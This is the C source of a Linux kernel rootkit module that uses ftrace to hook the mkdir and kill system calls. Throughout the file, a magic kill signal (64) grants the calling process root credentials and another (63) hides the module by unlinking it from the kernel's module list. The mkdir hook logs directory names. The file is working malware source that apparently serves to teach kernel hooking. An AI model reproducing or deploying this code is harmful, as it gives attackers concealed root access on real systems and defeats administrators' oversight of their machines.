#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("DeLuks");
MODULE_DESCRIPTION("SYS_CALLME HOOK");
MODULE_VERSION("0.01");

/*---------[ CHECK KERNEL VERSION AND ARCH ]---------*/
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)) 
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS // if defined
/*---------[ ORIGINAL FUNCTION POINTERS ]---------*/
static asmlinkage long (*orig_mkdir)(const struct pt_regs*);
static asmlinkage long (*orig_kill)(const struct pt_regs*);

/*---------[ FUNCTION PROTOTYPES]---------*/

/*---------{ HOOKED FUNCTION PROTOTYPES }---------*/
asmlinkage int hook_mkdir(const struct pt_regs* regs);
asmlinkage int hook_kill(const struct pt_regs* regs);
/*---------{ CUSTOM FUNCTION PROTOTYPES }---------*/
void set_root(void);
void hideme(void);
void showme(void);

/*---------[ GLOBAL VARIABLES ]---------*/
static short hidden = 0;

/*---------[ ACTUAL FUNCTIONS HOOK LOGIC ]---------*/
asmlinkage int hook_mkdir(const struct pt_regs* regs){
  char __user *pathname = (char*)regs->di;
  char dir_name[NAME_MAX] = {0};

  // strncpy_from_user is \0 aware, unlike copy_from_user
  long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

  if (error > 0)
    printk(KERN_INFO "rootkit: [+] trying to create directory with name: %s\n", dir_name);

  orig_mkdir(regs);
  return 0;
}

asmlinkage int hook_kill(const struct pt_regs* regs) {
  void set_root(void);
  void showme(void);
  void hideme(void);

  int sig = regs->si;

  if (sig == 64) {
    printk(KERN_INFO "rootkit: [+] giving root...\n");
    set_root();
    return 0;
  }
  
  if ((sig == 63) && (hidden == 0)) {
    printk(KERN_INFO "rootkit: [+] hiding rootkit module\n");
    hideme();
    hidden = 1;

  } else if ((sig == 63) && (hidden == 1)) {
    
    printk(KERN_INFO "rootkit: [+] revealing rootkit\n");
    showme();
    hidden = 0;
  } 
  
  return orig_kill(regs);
}
#endif
/*---------[ GLOBAL VARIABLES AND STUFF ]---------*/
static short priv = 0;
static struct list_head* prev_module;

/*---------[ FUNCTIONS TO HOOK ]---------*/
static struct ftrace_hook hooks[] = {
  HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
  HOOK("sys_kill", hook_kill, &orig_kill),
};

/*---------[ CUSTOM FUNCTION IMPLEMENTATIONS ]---------*/
void set_root(void) {
  struct cred* root;
  root = prepare_creds();

  if (root == NULL) {
    return;
  }

  if (priv == 0) {
    root->uid.val   = root->  gid.val   = 0;
    root->euid.val  = root->  egid.val  = 0;
    root->suid.val  = root->  sgid.val  = 0;
    root->fsuid.val = root->  fsgid.val = 0;
    priv = 1;
  } else {
    root->uid.val   = root->  gid.val   = 1000;
    root->euid.val  = root->  egid.val  = 1000;
    root->suid.val  = root->  sgid.val  = 1000;
    root->fsuid.val = root->  fsgid.val = 1000;
  }
    // set to 1000 for normal perms
    
  commit_creds(root);
}

void hideme(void){
  prev_module = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
}

void showme(void) {
  list_add(&THIS_MODULE->list, prev_module);
}

/*---------[ CODE BEING RAN ONCE MODULE IS LOADED ]---------*/
static int __init rootkit_init(void) {
  int err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  
  if (err) {
    return err;
  }

  printk(KERN_INFO "[+] Rootkit loaded!\n");
  return 0;
}

/*---------[ CODE BEING RAN ONCE MODULE IS UNLOADED ]---------*/
static void __exit rootkit_exit(void) {
  
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  
  printk(KERN_INFO "[+] Rootkit exiting!\n");
}

/*---------[ SPECIFYING WHICH FUNCTIONS TO RUN ON LOAD & UNLOAD ]---------*/
module_init(rootkit_init);
module_exit(rootkit_exit);
